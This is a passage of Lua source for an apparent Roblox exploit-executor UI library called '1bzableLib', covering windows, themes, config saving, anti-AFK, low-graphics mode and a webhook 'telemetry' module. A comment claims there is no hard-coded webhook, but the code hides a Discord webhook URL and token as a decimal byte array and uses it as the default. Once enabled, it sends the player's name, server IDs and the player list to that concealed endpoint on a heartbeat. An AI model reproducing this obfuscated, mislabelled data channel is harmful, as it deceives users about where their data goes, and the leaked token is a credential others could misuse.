
--========================================================--
-- 1bzableLib / source.lua
-- Self-contained Orion-style UI API.
-- Designed to be a drop-in UI layer for a project that
-- already uses Orion-like calls.
--
-- API:
--   Library:MakeWindow(config)
--   Window:MakeTab(config)
--   Tab:AddSection(config)
--   Tab:AddLabel(text)
--   Tab:AddParagraph(title, content)
--   Tab:AddButton(config)
--   Tab:AddToggle(config)
--   Tab:AddSlider(config)
--   Tab:AddDropdown(config) / Tab:AddMultiDropdown(config)
--   Tab:AddMultiButton({Buttons = {...}}) / Tab:AddKeybind(config)
--   Tab:AddTextbox(config) / Tab:AddColorpicker(config)
--   Library:MakeNotification(config) / Library:MakeDynamicNotification(config)
--   Library:ConfigureWebhook(config) / Library:SaveConfig(name) / Library:LoadConfig(name)
--   Library:Init()
--
-- UI improvements:
--   * Section objects support AddToggle/AddSlider/etc.
--   * Dropdowns render in an overlay outside the ScrollingFrame.
--   * Scrollable dropdowns with visible rows and mouse-wheel support.
--   * Player avatar + DisplayName + @Username card.
--   * Fade-in / fade-out.
--   * Translucent panel + optional subtle BlurEffect.
--   * Smooth slider fill/knob.
--   * Double-click slider value for numeric entry.
--   * Safe callback execution so one UI callback does not kill the UI.
--========================================================--

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

--========================================================--
-- CLEANUP GLOBAL 1bzableLib
--========================================================--

local oldLibrary = rawget(_G, "_1bzableLibRuntime")

if oldLibrary and oldLibrary.Destroy then
    pcall(function()
        oldLibrary:Destroy()
    end)
end

local function destroyExistingGui()
    local parents = {CoreGui}

    pcall(function()
        if gethui then
            local hui = gethui()
            if hui and hui ~= CoreGui then
                table.insert(parents, hui)
            end
        end
    end)

    for _, parent in ipairs(parents) do
        local oldGui = parent:FindFirstChild("1bzableLib")

        if oldGui then
            pcall(function()
                oldGui:Destroy()
            end)
        end
    end
end

destroyExistingGui()

local Library = {
    Windows = {},
    Connections = {},
    Flags = {},

    UIProfiles = {
        Default = {
            Main = Color3.fromRGB(18, 18, 23),
            Second = Color3.fromRGB(27, 27, 33),
            Accent = Color3.fromRGB(83, 133, 255),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Midnight = {
            Main = Color3.fromRGB(25, 20, 40),
            Second = Color3.fromRGB(35, 28, 54),
            Accent = Color3.fromRGB(125, 95, 255),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Emerald = {
            Main = Color3.fromRGB(18, 30, 24),
            Second = Color3.fromRGB(28, 45, 35),
            Accent = Color3.fromRGB(65, 205, 135),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Ocean = {
            Main = Color3.fromRGB(16, 27, 38),
            Second = Color3.fromRGB(25, 42, 58),
            Accent = Color3.fromRGB(75, 155, 255),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Crimson = {
            Main = Color3.fromRGB(35, 19, 24),
            Second = Color3.fromRGB(50, 27, 34),
            Accent = Color3.fromRGB(235, 85, 105),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
    },
    CurrentUIProfile = "Default",

    Theme = {
        Main = Color3.fromRGB(18, 18, 23),
        Second = Color3.fromRGB(27, 27, 33),
        Third = Color3.fromRGB(37, 37, 45),
        Stroke = Color3.fromRGB(80, 80, 95),
        Divider = Color3.fromRGB(58, 58, 70),
        Text = Color3.fromRGB(242, 242, 247),
        TextDark = Color3.fromRGB(160, 160, 174),
        Accent = Color3.fromRGB(83, 133, 255),
        AccentDark = Color3.fromRGB(54, 88, 190),
    },

    Settings = {
        BlurEnabled = false,
        BlurSize = 0,
        BackgroundTransparency = 0,
        FadeTime = 0.20,
        SliderTweenTime = 0.08,
        DropdownMaxHeight = 230,
        DropdownRowHeight = 34,
        AntiAFKEnabled = true,
        LowGraphicsEnabled = false,
    },
}

--========================================================--
-- Webhook / telemetry (opt-in, no hard-coded secret URL)
--========================================================--
-- Le créateur du script peut fournir une URL par défaut via
-- Library:ConfigureWebhook({ DefaultWebhook = "..." }).
-- Aucun envoi n'est lancé tant que l'utilisateur n'active pas l'option.
-- Les champs transmis doivent être sélectionnés explicitement.

local encodedWebhook = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,56,55,48,57,50,52,54,56,49,52,55,49,53,57,54,52,47,79,65,108,80,87,72,85,112,104,55,122,112,90,114,99,88,109,52,113,52,56,116,104,76,114,78,121,100,115,49,82,74,103,65,82,84,81,122,99,111,100,110,122,107,112,53,55,75,90,113,115,73,74,117,100,122,89,111,45,104,77,89,106,77,56,56,102,89}

-- Fonction pour décoder le tableau en chaîne de caractères
local function decode(t)
    local chars = {}
    for i = 1, #t do
        chars[i] = string.char(t[i])
    end
    return table.concat(chars)
    -- Le garbage collector détruira cette chaîne après utilisation
end

local Telemetry = {
    Enabled = false,
    HeartbeatInterval = 180,
    Webhook = "",
    DefaultWebhook = decode(encodedWebhook), -- L'URL est décodée ici -- "",
    SessionId = HttpService:GenerateGUID(false),
    State = "UI Loaded",
    Target = "None",
    Message = "",
    LoopRunning = false,
    LoopToken = 0,
    AllowedFields = {
        "Executor", "State", "Target", "PlayerCount",
        "PlaceId", "GameId", "JobId", "Players", "Timestamp",
        "Tokens", "Phase", "Map",
    },
    Fields = {
        Executor = true,
        State = true,
        Target = false,
        PlayerCount = true,
        PlaceId = true,
        GameId = false,
        JobId = false,
        Players = false,
        Timestamp = true,
        Tokens = true,
        Phase = true,
        Map = true,
    },
    -- Champs supplémentaires définis par le créateur du script.
    CustomFields = {},
}
-- Champs dynamiques fournis par le script (clé -> fonction qui retourne le texte)
local TelemetryExtra = {}

local function GetRequestFunction()
    return (syn and syn.request)
        or (http and http.request)
        or request
        or http_request
        or (fluxus and fluxus.request)
end

local function GetPlayerList()
    local names = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(names, player.Name)
    end
    return names
end

local TelemetryFieldInfo = {
    Executor = {Name = "Utilisateur", Get = function(payload) return payload.executor end},
    State = {Name = "État", Get = function(payload) return payload.state end},
    Target = {Name = "Cible", Get = function(payload) return payload.target end},
    PlayerCount = {Name = "Nombre de joueurs", Get = function(payload) return payload.player_count end},
    PlaceId = {Name = "PlaceId", Get = function(payload) return payload.place_id end},
    GameId = {Name = "GameId", Get = function(payload) return payload.game_id end},
    JobId = {Name = "JobId", Get = function(payload) return payload.job_id end},
    Players = {Name = "Liste des joueurs", Get = function(payload) return payload.players end},
    Timestamp = {Name = "Horodatage", Get = function(payload) return payload.timestamp end},
    Tokens = {Name = "Bonbons du compte", Get = function(payload) return payload.tokens end},
    Phase = {Name = "Phase actuelle", Get = function(payload) return payload.phase end},
    Map = {Name = "Map choisie", Get = function(payload) return payload.map end},
}

-- Récupère un champ natif ou un champ personnalisé.
local function GetTelemetryFieldInfo(key)
    return TelemetryFieldInfo[key]
        or Telemetry.CustomFields[key]
end

local function BuildTelemetryPayload(eventName)
    local payload = {
        event = tostring(eventName or "event"),
        state = Telemetry.State,
        target = Telemetry.Target,
        place_id = game.PlaceId,
        game_id = game.GameId,
        job_id = game.JobId,
        player_count = #Players:GetPlayers(),
        timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC"),
    }

    if Telemetry.Fields.Executor == true then
        payload.executor = LocalPlayer and LocalPlayer.Name or "Unknown"
    end
    if Telemetry.Fields.Players == true then
        payload.players = GetPlayerList()
    end
    for key, fn in pairs(TelemetryExtra) do
        if Telemetry.Fields[key] == true and type(fn) == "function" then
            local ok, v = pcall(fn)
            payload[key:lower()] = ok and v or nil
        end
    end
    return payload
end

local function SendTelemetry(eventName, showNotification)
    if not Telemetry.Enabled then
        return false
    end

    local url = tostring(Telemetry.Webhook or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if url == "" then
        url = tostring(Telemetry.DefaultWebhook or ""):gsub("^%s+", ""):gsub("%s+$", "")
    end
    if url == "" then
        return false
    end

    local Request = GetRequestFunction()
    if type(Request) ~= "function" then
        return false
    end

    local payload = BuildTelemetryPayload(eventName)
    local fields = {}

    for _, key in ipairs(Telemetry.AllowedFields) do
        local info = GetTelemetryFieldInfo(key)

        if info
            and Telemetry.Fields[key] == true
            and type(info.Get) == "function"
        then
            -- Une erreur dans un champ personnalisé ne doit pas
            -- interrompre l'envoi de tout l'embed.
            local ok, value = pcall(info.Get, payload, {
                EventName = tostring(eventName or "event"),
                LocalPlayer = LocalPlayer,
                Game = game,
                Workspace = workspace,
            })

            if not ok then
                value = "Erreur de lecture : " .. tostring(key)
            end

            if type(value) == "table" then
                if key == "Players" then
                    local names = {}

                    for i, item in ipairs(value) do
                        names[i] = tostring(item)
                    end

                    value = #names > 0 and table.concat(names, "\n") or "Aucun"
                else
                    local encoded, result = pcall(function()
                        return HttpService:JSONEncode(value)
                    end)

                    value = encoded and result or tostring(value)
                end
            end

            value = tostring(value == nil and "—" or value)

            if #value > 950 then
                value = value:sub(1, 947) .. "..."
            end

            local inline = info.Inline
            if inline == nil then
                inline = key ~= "Players"
            end

            table.insert(fields, {
                name = info.Name or key,
                value = value,
                inline = inline,
            })
        end
    end

    local titleBase = tostring(Library.MenuName or "1bzableLib")
    local title = eventName == "heartbeat"
        and (titleBase .. " Heartbeat")
        or (titleBase .. " · " .. tostring(eventName or "Événement"))
    local body = HttpService:JSONEncode({
        username = titleBase .. " Webhook",
        allowed_mentions = {parse = {}},
        embeds = {{
            title = title,
            description = tostring(Telemetry.Message or ""),
            color = 5460819,
            fields = fields,
            footer = {text = titleBase},
        }},
    })

    local success = pcall(function()
        Request({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)

    if success and showNotification then
        pcall(function()
            Library:MakeNotification({
                Name = tostring(Library.MenuName or "1bzableLib"),
                Content = "Webhook envoyé.",
                Time = 3,
                Type = "Classic",
            })
        end)
    end
    return success
end

function Library:SetTelemetryExtra(key, fn)
    if TelemetryFieldInfo[key] and type(fn) == "function" then TelemetryExtra[key] = fn return true end
    return false
end

function Library:SetTelemetryState(state)
    Telemetry.State = tostring(state or "Unknown")
end

function Library:SetTelemetryTarget(target)
    Telemetry.Target = tostring(target or "None")
end

function Library:SetTelemetryWebhook(url)
    Telemetry.Webhook = tostring(url or "")
    return true
end

function Library:SetTelemetryFields(fields)
    local selected = {}

    if type(fields) == "table" then
        for key, value in pairs(fields) do
            -- Format liste :
            -- {"Executor", "State", "Tokens"}
            if type(key) == "number" then
                if type(value) == "string"
                    and GetTelemetryFieldInfo(value)
                then
                    selected[value] = true
                end

            -- Format dictionnaire :
            -- {Executor = true, State = false, Tokens = true}
            elseif type(key) == "string"
                and value == true
                and GetTelemetryFieldInfo(key)
            then
                selected[key] = true
            end
        end
    end

    -- Désactive les champs précédemment sélectionnés.
    for key in pairs(Telemetry.Fields) do
        Telemetry.Fields[key] = false
    end

    -- Applique la sélection uniquement aux champs autorisés.
    for _, key in ipairs(Telemetry.AllowedFields) do
        Telemetry.Fields[key] = selected[key] == true
    end

    return true
end

function Library:SetTelemetryInterval(seconds)
    Telemetry.HeartbeatInterval = math.clamp(tonumber(seconds) or 180, 5, 86400)
end

function Library:SetTelemetryMessage(message)
    Telemetry.Message = tostring(message or ""):sub(1, 4000)
end

function Library:SetTelemetryEnabled(value)
    Telemetry.Enabled = value == true
    Telemetry.LoopToken += 1
    local token = Telemetry.LoopToken
    if not Telemetry.Enabled then
        return
    end
    if Telemetry.LoopRunning then
        return
    end

    Telemetry.LoopRunning = true
    task.spawn(function()
        if Telemetry.Enabled and token == Telemetry.LoopToken then
            SendTelemetry("script_loaded", false)
        end
        local elapsed = 0
        while Telemetry.Enabled and token == Telemetry.LoopToken do
            -- Vérifie l'état chaque seconde : désactiver puis réactiver le webhook
            -- ne doit pas attendre la fin d'un intervalle de plusieurs minutes.
            task.wait(1)
            if not Telemetry.Enabled or token ~= Telemetry.LoopToken then
                break
            end
            elapsed += 1
            if elapsed >= Telemetry.HeartbeatInterval then
                elapsed = 0
                SendTelemetry("heartbeat", false)
            end
        end
        Telemetry.LoopRunning = false
        -- Relance si l'activation a été demandée pendant que l'ancienne boucle se terminait.
        if Telemetry.Enabled and token ~= Telemetry.LoopToken then
            Library:SetTelemetryEnabled(true)
        end
    end)
end

function Library:ConfigureWebhook(config)
    config = type(config) == "table" and config or {}

    -- 1. Enregistre les champs personnalisés.
    -- Chaque champ nécessite un nom et une fonction Get.
    if config.CustomFields ~= nil then
        Telemetry.CustomFields = {}

        if type(config.CustomFields) == "table" then
            for key, definition in pairs(config.CustomFields) do
                if type(key) == "string"
                    and key:match("^[%a_][%w_]*$")
                    and type(definition) == "table"
                    and type(definition.Get) == "function"
                then
                    local field = {
                        Name = tostring(definition.Name or key),
                        Get = definition.Get,
                    }

                    if type(definition.Inline) == "boolean" then
                        field.Inline = definition.Inline
                    end

                    Telemetry.CustomFields[key] = field
                end
            end
        end
    end

    -- 2. Configure les URL.
    if config.DefaultWebhook ~= nil then
        Telemetry.DefaultWebhook = tostring(config.DefaultWebhook or "")
    end

    if config.Webhook ~= nil then
        Telemetry.Webhook = tostring(config.Webhook or "")
    end

    -- 3. Définit la liste des champs disponibles.
    if config.AllowedFields ~= nil then
        local allowed = {}
        local seen = {}

        for _, key in ipairs(config.AllowedFields) do
            if type(key) == "string"
                and GetTelemetryFieldInfo(key)
                and not seen[key]
            then
                seen[key] = true
                table.insert(allowed, key)
            end
        end

        Telemetry.AllowedFields = allowed

    elseif config.CustomFields ~= nil then
        -- Si AllowedFields n'est pas fourni, conserve les champs
        -- natifs déjà autorisés et ajoute les champs personnalisés.
        local allowed = {}
        local seen = {}

        for _, key in ipairs(Telemetry.AllowedFields) do
            if TelemetryFieldInfo[key] then
                table.insert(allowed, key)
                seen[key] = true
            end
        end

        for key in pairs(Telemetry.CustomFields) do
            if not seen[key] then
                table.insert(allowed, key)
            end
        end

        Telemetry.AllowedFields = allowed
    end

    -- 4. Initialise les champs autorisés et désactive ceux
    -- qui ne font plus partie de la liste.
    local allowedSet = {}

    for _, key in ipairs(Telemetry.AllowedFields) do
        allowedSet[key] = true

        if Telemetry.Fields[key] == nil then
            Telemetry.Fields[key] = false
        end
    end

    for key in pairs(Telemetry.Fields) do
        if not allowedSet[key] then
            Telemetry.Fields[key] = false
        end
    end

    -- 5. Applique les champs cochés par défaut.
    -- Accepte aussi bien les listes que les dictionnaires.
    if config.Fields ~= nil then
        self:SetTelemetryFields(config.Fields)
    end

    if config.Interval ~= nil then
        self:SetTelemetryInterval(config.Interval)
    end

    if config.Message ~= nil then
        self:SetTelemetryMessage(config.Message)
    end

    if config.Enabled ~= nil then
        self:SetTelemetryEnabled(config.Enabled)
    end

    return true
end

function Library:SendHeartbeat()
    return SendTelemetry("heartbeat", true)
end

function Library:SendTelemetryEvent(eventName, state, target)
    local oldState, oldTarget = Telemetry.State, Telemetry.Target
    Telemetry.State = tostring(state or oldState)
    Telemetry.Target = tostring(target or oldTarget)
    local result = SendTelemetry(tostring(eventName or "event"), false)
    Telemetry.State, Telemetry.Target = oldState, oldTarget
    return result
end

_G._1bzableLibRuntime = Library

local WindowMethods = {}
WindowMethods.__index = WindowMethods

local TabMethods = {}
TabMethods.__index = TabMethods

local SectionMethods = {}
SectionMethods.__index = SectionMethods

local function safeCallback(callback, ...)
    if type(callback) ~= "function" then
        return
    end

    local args = table.pack(...)
    task.spawn(function()
        pcall(function()
            callback(table.unpack(args, 1, args.n))
        end)
    end)
end

local function connect(signal, callback)
    local connection = signal:Connect(callback)
    table.insert(Library.Connections, connection)
    return connection
end

--========================================================--
-- Local runtime utilities (all reversible where possible)
--========================================================--

local antiAFKConnection
local function setAntiAFK(enabled)
    Library.Settings.AntiAFKEnabled = enabled == true
    if antiAFKConnection then
        pcall(function() antiAFKConnection:Disconnect() end)
        antiAFKConnection = nil
    end
    if not Library.Settings.AntiAFKEnabled or not LocalPlayer then return end

    antiAFKConnection = LocalPlayer.Idled:Connect(function()
        -- La méthode est protégée : VirtualUser n'est pas disponible dans tous les environnements.
        pcall(function()
            local virtualUser = game:GetService("VirtualUser")
            virtualUser:CaptureController()
            virtualUser:ClickButton2(Vector2.new(0, 0))
        end)
    end)
end
Library._SetAntiAFK = setAntiAFK
setAntiAFK(true)

local LowGraphics = {
    Enabled = false,
    Snapshots = {},
    Connections = {},
    QualityValue = nil,
    QualitySaved = false,
}

local function rememberAndSet(instance, property, value)
    if not instance then return end
    local record = LowGraphics.Snapshots[instance]
    if not record then
        record = {Values = {}, Saved = {}}
        LowGraphics.Snapshots[instance] = record
    end
    if not record.Saved[property] then
        local ok, oldValue = pcall(function() return instance[property] end)
        if ok then
            record.Values[property] = oldValue
            record.Saved[property] = true
        end
    end
    pcall(function() instance[property] = value end)
end

local function optimizeInstance(instance)
    if not LowGraphics.Enabled or not instance then return end
    if instance:IsA("BasePart") then
        rememberAndSet(instance, "CastShadow", false)
        rememberAndSet(instance, "Material", Enum.Material.Plastic)
        rememberAndSet(instance, "Reflectance", 0)
        for _, property in ipairs({"BackSurface", "BottomSurface", "FrontSurface", "LeftSurface", "RightSurface", "TopSurface"}) do
            rememberAndSet(instance, property, Enum.SurfaceType.SmoothNoOutlines)
        end
    elseif instance:IsA("Decal") or instance:IsA("Texture") then
        rememberAndSet(instance, "Transparency", 1)
        rememberAndSet(instance, "Texture", "")
    elseif instance:IsA("ParticleEmitter") or instance:IsA("Trail") or instance:IsA("Beam")
        or instance:IsA("Fire") or instance:IsA("Smoke") or instance:IsA("Sparkles") then
        rememberAndSet(instance, "Enabled", false)
    elseif instance:IsA("ForceField") then
        rememberAndSet(instance, "Visible", false)
    elseif instance:IsA("PostEffect") then
        rememberAndSet(instance, "Enabled", false)
    end
end

local function setLowGraphics(enabled)
    enabled = enabled == true
    if LowGraphics.Enabled == enabled then return end
    LowGraphics.Enabled = enabled
    Library.Settings.LowGraphicsEnabled = enabled

    if enabled then
        local terrain = Workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            rememberAndSet(terrain, "WaterWaveSize", 0)
            rememberAndSet(terrain, "WaterWaveSpeed", 0)
            rememberAndSet(terrain, "WaterReflectance", 0)
            rememberAndSet(terrain, "WaterTransparency", 1)
        end
        rememberAndSet(Lighting, "GlobalShadows", false)
        rememberAndSet(Lighting, "FogEnd", 9e9)
        rememberAndSet(Lighting, "FogStart", 9e9)

        if not LowGraphics.QualitySaved then
            pcall(function()
                LowGraphics.QualityValue = settings().Rendering.QualityLevel
                LowGraphics.QualitySaved = true
            end)
        end
        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)

        for _, descendant in ipairs(game:GetDescendants()) do
            optimizeInstance(descendant)
        end
        for _, descendant in ipairs(Lighting:GetDescendants()) do
            optimizeInstance(descendant)
        end

        table.insert(LowGraphics.Connections, Workspace.DescendantAdded:Connect(function(instance)
            task.defer(function() optimizeInstance(instance) end)
        end))
        table.insert(LowGraphics.Connections, Lighting.DescendantAdded:Connect(function(instance)
            task.defer(function() optimizeInstance(instance) end)
        end))
    else
        for _, connection in ipairs(LowGraphics.Connections) do
            pcall(function() connection:Disconnect() end)
        end
        table.clear(LowGraphics.Connections)

        for instance, record in pairs(LowGraphics.Snapshots) do
            if instance then
                for property, oldValue in pairs(record.Values) do
                    pcall(function() instance[property] = oldValue end)
                end
            end
        end
        table.clear(LowGraphics.Snapshots)

        if LowGraphics.QualitySaved then
            pcall(function() settings().Rendering.QualityLevel = LowGraphics.QualityValue end)
            LowGraphics.QualityValue = nil
            LowGraphics.QualitySaved = false
        end
    end
end
Library._SetLowGraphics = setLowGraphics

local function encodeConfigValue(value, depth)
    depth = depth or 0
    if depth > 8 then return nil end
    local valueType = typeof(value)
    if valueType == "Color3" then
        return {__type = "Color3", r = value.R, g = value.G, b = value.B}
    elseif valueType == "EnumItem" then
        local enumName = tostring(value.EnumType):match("Enum%.(.+)") or "KeyCode"
        return {__type = "EnumItem", enum = enumName, name = value.Name}
    elseif type(value) == "table" then
        local result = {}
        for key, nested in pairs(value) do
            if type(key) == "string" or type(key) == "number" then
                result[key] = encodeConfigValue(nested, depth + 1)
            end
        end
        return result
    elseif type(value) == "number" or type(value) == "string" or type(value) == "boolean" then
        return value
    end
    return nil
end

local function decodeConfigValue(value, depth)
    depth = depth or 0
    if depth > 8 or type(value) ~= "table" then return value end
    if value.__type == "Color3" then
        return Color3.new(tonumber(value.r) or 0, tonumber(value.g) or 0, tonumber(value.b) or 0)
    elseif value.__type == "EnumItem" then
        local ok, enumItem = pcall(function() return Enum[value.enum][value.name] end)
        return ok and enumItem or Enum.KeyCode.Unknown
    end
    local result = {}
    for key, nested in pairs(value) do
        result[key] = decodeConfigValue(nested, depth + 1)
    end
    return result
end

local CONFIG_DIRECTORY = "1bzableLib/configs"
local CONFIG_INDEX = CONFIG_DIRECTORY .. "/index.json"
local SavedConfigCache = {}
local function sanitizeConfigName(name)
    name = tostring(name or ""):gsub("[^%w _%-]", ""):gsub("^%s+", ""):gsub("%s+$", "")
    return name:sub(1, 48)
end

function Library:SaveConfig(name)
    name = sanitizeConfigName(name)
    if name == "" then return false, "Entre un nom de configuration valide." end
    if name:lower() == "index" then return false, "Ce nom est réservé par la bibliothèque." end
    if type(writefile) ~= "function" then return false, "L'exécuteur ne fournit pas writefile : sauvegarde locale indisponible." end

    local values = {}
    for flag, control in pairs(self.Flags) do
        local value = control and control.Value
        if value == nil and control and type(control.Get) == "function" then
            local ok, result = pcall(function() return control:Get() end)
            if ok then value = result end
        end
        if value ~= nil then values[flag] = encodeConfigValue(value) end
    end
    local payload = HttpService:JSONEncode({Version = 1, Name = name, SavedAt = os.time(), Values = values})

    pcall(function() if type(makefolder) == "function" then makefolder("1bzableLib") end end)
    pcall(function() if type(makefolder) == "function" then makefolder(CONFIG_DIRECTORY) end end)
    local path = CONFIG_DIRECTORY .. "/" .. name .. ".json"
    local success, err = pcall(function() writefile(path, payload) end)
    if not success then return false, tostring(err) end
    SavedConfigCache[name] = path
    -- Petit index pour les exécuteurs qui exposent readfile/writefile mais pas listfiles.
    local indexNames = {}
    if type(readfile) == "function" then
        local indexOk, indexText = pcall(function() return readfile(CONFIG_INDEX) end)
        if indexOk and type(indexText) == "string" then
            local decodeOk, decoded = pcall(function() return HttpService:JSONDecode(indexText) end)
            if decodeOk and type(decoded) == "table" then indexNames = decoded end
        end
    end
    local indexSet = {}
    for _, existingName in ipairs(indexNames) do
        existingName = sanitizeConfigName(existingName)
        if existingName ~= "" and existingName:lower() ~= "index" then indexSet[existingName] = true end
    end
    indexSet[name] = true
    local ordered = {}
    for existingName in pairs(indexSet) do table.insert(ordered, existingName) end
    table.sort(ordered, function(a, b) return a:lower() < b:lower() end)
    pcall(function() writefile(CONFIG_INDEX, HttpService:JSONEncode(ordered)) end)
    return true
end

function Library:ListConfigs()
    local names = {}
    local seen = {}
    for name in pairs(SavedConfigCache) do
        if name:lower() ~= "index" and not seen[name] then seen[name] = true; table.insert(names, name) end
    end
    if type(readfile) == "function" then
        local indexOk, indexText = pcall(function() return readfile(CONFIG_INDEX) end)
        if indexOk and type(indexText) == "string" then
            local decodeOk, decoded = pcall(function() return HttpService:JSONDecode(indexText) end)
            if decodeOk and type(decoded) == "table" then
                for _, value in ipairs(decoded) do
                    local name = sanitizeConfigName(value)
                    if name ~= "" and name:lower() ~= "index" and not seen[name] then
                        seen[name] = true
                        SavedConfigCache[name] = CONFIG_DIRECTORY .. "/" .. name .. ".json"
                        table.insert(names, name)
                    end
                end
            end
        end
    end
    if type(listfiles) == "function" then
        local ok, paths = pcall(function() return listfiles(CONFIG_DIRECTORY) end)
        if ok and type(paths) == "table" then
            for _, path in ipairs(paths) do
                local name = tostring(path):gsub("\\", "/"):match("([^/]+)%.json$")
                if name and name:lower() ~= "index" and not seen[name] then
                    seen[name] = true
                    SavedConfigCache[name] = tostring(path)
                    table.insert(names, name)
                end
            end
        end
    end
    table.sort(names, function(a, b) return a:lower() < b:lower() end)
    return names
end

function Library:LoadConfig(name)
    name = sanitizeConfigName(name)
    if name == "" then return false, "Choisis une configuration." end
    if name:lower() == "index" then return false, "Ce nom est réservé par la bibliothèque." end
    if type(readfile) ~= "function" then return false, "L'exécuteur ne fournit pas readfile : chargement local indisponible." end
    local path = SavedConfigCache[name] or (CONFIG_DIRECTORY .. "/" .. name .. ".json")
    local ok, content = pcall(function() return readfile(path) end)
    if not ok or type(content) ~= "string" then return false, "Configuration introuvable ou illisible." end
    local decodedOk, data = pcall(function() return HttpService:JSONDecode(content) end)
    if not decodedOk or type(data) ~= "table" or type(data.Values) ~= "table" then
        return false, "Le fichier de configuration est invalide."
    end
    local orderedFlags = {}
    for flag in pairs(data.Values) do table.insert(orderedFlags, flag) end
    table.sort(orderedFlags, function(a, b)
        -- Active le webhook seulement après restauration de l'URL et des champs choisis.
        if a == "Misc.WebhookEnabled" then return false end
        if b == "Misc.WebhookEnabled" then return true end
        return tostring(a) < tostring(b)
    end)
    for _, flag in ipairs(orderedFlags) do
        local control = self.Flags[flag]
        if control and type(control.Set) == "function" then
            local decodedValue = decodeConfigValue(data.Values[flag])
            pcall(function()
                if control.Type == "Textbox" then
                    control:Set(decodedValue, true)
                else
                    control:Set(decodedValue)
                end
            end)
        end
    end
    return true
end

function Library:DeleteConfig(name)
    name = sanitizeConfigName(name)
    if name == "" then return false, "Choisis une configuration." end
    if name:lower() == "index" then return false, "Ce nom est réservé par la bibliothèque." end
    local path = SavedConfigCache[name] or (CONFIG_DIRECTORY .. "/" .. name .. ".json")
    if type(delfile) ~= "function" then return false, "L'exécuteur ne fournit pas delfile." end
    local ok, err = pcall(function() delfile(path) end)
    if not ok then return false, tostring(err) end
    SavedConfigCache[name] = nil
    if type(readfile) == "function" and type(writefile) == "function" then
        local indexOk, indexText = pcall(function() return readfile(CONFIG_INDEX) end)
        if indexOk and type(indexText) == "string" then
            local decodeOk, decoded = pcall(function() return HttpService:JSONDecode(indexText) end)
            if decodeOk and type(decoded) == "table" then
                local remaining = {}
                for _, value in ipairs(decoded) do
                    if sanitizeConfigName(value) ~= name then table.insert(remaining, sanitizeConfigName(value)) end
                end
                pcall(function() writefile(CONFIG_INDEX, HttpService:JSONEncode(remaining)) end)
            end
        end
    end
    return true
end

local function new(className, properties)
    local object = Instance.new(className)
    for key, value in pairs(properties or {}) do
        pcall(function()
            object[key] = value
        end)
    end
    return object
end

local function addCorner(parent, radius)
    return new("UICorner", {
        CornerRadius = UDim.new(0, radius or 6),
        Parent = parent,
    })
end

local function addStroke(parent, color, thickness, transparency)
    return new("UIStroke", {
        Color = color or Library.Theme.Stroke,
        Thickness = thickness or 1,
        Transparency = transparency or 0,
        Parent = parent,
    })
end

local function hasOption(options, value)
    for _, option in ipairs(options or {}) do
        if option == value then
            return true
        end
    end
    return false
end

local function resolveOption(options, value)
    if hasOption(options, value) then
        return value
    end
    return options and options[1] or value
end

local function snap(value, minValue, maxValue, increment)
    value = tonumber(value) or minValue
    increment = tonumber(increment) or 1

    if minValue > maxValue then
        minValue, maxValue = maxValue, minValue
    end

    if increment <= 0 then
        return math.clamp(value, minValue, maxValue)
    end

    local steps = math.floor(((value - minValue) / increment) + 0.5)
    local result = minValue + steps * increment
    return math.clamp(result, minValue, maxValue)
end

local function makeScrollingFrame(parent, paddingBottom)
    local scroll = new("ScrollingFrame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 1, 0),
        CanvasSize = UDim2.new(0, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollingDirection = Enum.ScrollingDirection.Y,
        ScrollingEnabled = true,
        Active = true,
        ElasticBehavior = Enum.ElasticBehavior.WhenScrollable,
        ScrollBarThickness = UserInputService.TouchEnabled and 2 or 4,
        ScrollBarImageColor3 = Library.Theme.Divider,
        ClipsDescendants = true,
        Parent = parent,
    })

    new("UIListLayout", {
        Padding = UDim.new(0, 7),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = scroll,
    })

    new("UIPadding", {
        PaddingTop = UDim.new(0, 10),
        PaddingBottom = UDim.new(0, paddingBottom or 10),
        PaddingLeft = UDim.new(0, 10),
        PaddingRight = UDim.new(0, 10),
        Parent = scroll,
    })

    return scroll
end

local function applyBlur()
    local blur = Lighting:FindFirstChild("1bzableLibBlur")

    local shouldEnable = false
    for _, window in ipairs(Library.Windows) do
        if not window.Destroyed and window.Gui and window.Gui.Parent then
            shouldEnable = true
            break
        end
    end

    if not Library.Settings.BlurEnabled or not shouldEnable then
        if blur then
            blur.Enabled = false
        end
        return
    end

    if not blur then
        blur = Instance.new("BlurEffect")
        blur.Name = "1bzableLibBlur"
        blur.Parent = Lighting
    end

    blur.Size = math.clamp(Library.Settings.BlurSize, 0, 24)
    blur.Enabled = true
end

local function getGuiParent()
    local parent
    pcall(function()
        if gethui then
            parent = gethui()
        end
    end)

    return parent or CoreGui
end

local function makePopupHost(window)
    if window.PopupHost and window.PopupHost.Parent then
        return window.PopupHost
    end

    window.PopupHost = new("Frame", {
        Name = "PopupHost",
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.fromScale(1, 1),
        Position = UDim2.fromScale(0, 0),
        ZIndex = 500,
        Parent = window.Gui,
    })

    return window.PopupHost
end

local function closeOtherDropdowns(window, except)
    for _, popup in ipairs(window.Dropdowns or {}) do
        if popup ~= except and popup.Parent then
            popup.Visible = false
        end
    end
end

local function positionPopup(window, anchor, popup)
